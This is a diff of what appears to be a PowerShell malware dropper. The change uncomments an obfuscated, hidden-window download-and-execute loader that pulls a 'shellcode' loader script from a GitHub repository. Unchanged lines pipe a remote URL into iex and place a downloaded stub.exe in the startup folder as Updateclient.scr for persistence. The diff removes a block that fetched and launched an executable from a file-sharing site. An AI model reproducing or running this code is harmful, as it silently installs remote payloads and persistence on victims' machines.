@@ -107,9 +107,9 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 
 
 
-# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
-# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/shellcode/loaderclient.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 
 # $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/lmao.exe"
@@ -125,16 +125,6 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 
 
 iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
-
-$url = "https://anonsharing.com/file/2ed88b0d3a039596/2qy51h77z2pjs00d.exe"
-$output = "$dir\heloosigma.exe"
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process $output
-    Write-Host "Tệp đã được tải về thành công."
-}
 
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclient.scr"
